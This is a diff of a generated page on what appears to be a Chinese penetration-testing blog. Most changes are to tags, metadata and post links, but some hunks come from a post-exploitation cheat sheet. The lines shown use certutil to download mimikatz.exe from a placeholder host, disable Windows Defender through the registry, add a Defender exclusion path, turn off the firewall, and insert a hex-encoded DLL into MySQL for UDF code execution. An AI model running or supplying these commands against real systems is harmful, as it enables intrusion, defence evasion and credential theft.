@@ -7,13 +7,13 @@
   <meta name="description" content="Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Audit">
-<meta property="og:url" content="http://sherlocz.github.io/Audit/index.html">
+<meta property="og:title" content="Python">
+<meta property="og:url" content="http://sherlocz.github.io/Python/index.html">
 <meta property="og:site_name" content="Sriracha :)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-01-08T08:51:32.000Z">
+<meta property="og:updated_time" content="2019-01-08T08:50:58.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Audit">
+<meta name="twitter:title" content="Python">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -90,7 +90,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(100)</small></div></li>
+    <li><div class="all active">全部文章<small>(102)</small></div></li>
     
 </ul>
 <div class="left-bottom">
@@ -102,7 +102,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="100">
+<input type="hidden" id="yelog_site_posts_number" value="102">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -149,11 +149,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">JAVA</a>
+        <a class="color3">钓鱼</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">漏洞复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">JAVA</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -181,19 +185,19 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">免杀</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color3">注入</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">甲方安全</a>
+        <a class="color3">免杀</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">甲方安全</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -209,11 +213,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">CS插件</a>
+        <a class="color4">exchange</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color3">CobaltStrike</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">CS插件</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -225,11 +233,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">bypass</a>
+        <a class="color5">密码抓取</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">密码抓取</a>
+        <a class="color2">bypass</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -276,15 +284,27 @@
         <a class="color3">译文</a>
     </li>
     
-    <li class="article-tag-list-item">
-        <a class="color3">钓鱼</a>
-    </li>
-    
     <div class="clearfix"></div>
 </div>
 
     
     <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2021/01/05/A-D-Phishing/"
+           data-tag="钓鱼"
+           data-author="" >
+            <span class="post-title" title="攻防演练中的钓鱼攻击">攻防演练中的钓鱼攻击</span>
+            <span class="post-date" title="2021-01-05 10:15:17">2021/01/05</span>
+        </a>
+        
+        <a  class=""
+           href="/2021/01/04/exchange-pentent/"
+           data-tag="内网渗透,exchange"
+           data-author="" >
+            <span class="post-title" title="exchange基础渗透">exchange基础渗透</span>
+            <span class="post-date" title="2021-01-04 10:15:08">2021/01/04</span>
+        </a>
         
         <a  class=""
            href="/2020/12/22/sharpshares-code/"
@@ -1125,6 +1145,11 @@
 certutil.exe &amp;&amp; certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe    //bypass
 </code></pre><p>关闭defender:</p>
 <pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 1 /t REG_DWORD
+
+#C:\tmp加白名单#
+powershell -Command Add-MpPreference -ExclusionPath &quot;C:\tmp&quot; 
+
+https://docs.microsoft.com/fr-fr/powershell/module/defender/add-mppreference?view=win10-ps
 </code></pre><p>防火墙:</p>
 <pre><code>netsh advfirewall set allprofiles state off
 
@@ -1171,7 +1196,8 @@ plugin_passwd = xx
 </code></pre><p>powershell弹框：</p>
 <pre><code>Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox(&quot;xxxxx&quot;, &quot;OKOnly,MsgBoxSetForeground,SystemModal,Exclamation&quot;, &quot;&quot;)
 </code></pre><p>mysql-udf：</p>
-<pre><code>show variables like &apos;plugin%&apos;;  
+<pre><code>show variables like &quot;sec%&quot;
+show variables like &apos;plugin%&apos;;  
 create table temp(data longblob);
 insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
 update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
@@ -1224,7 +1250,7 @@ misc::memssp
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#爬虫','#JAVA','#漏洞复现','#反汇编','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#免杀','#注入','#甲方安全','#代码审计','#权限维持','#Python','#工具','#CS插件','#CobaltStrike','#环境搭建','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#思考','#应急响应','#译文','#钓鱼',],
+            'data': ['#爬虫','#钓鱼','#漏洞复现','#JAVA','#反汇编','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#注入','#免杀','#代码审计','#甲方安全','#权限维持','#Python','#工具','#exchange','#CobaltStrike','#CS插件','#环境搭建','#域渗透','#密码抓取','#bypass','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#思考','#应急响应','#译文',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
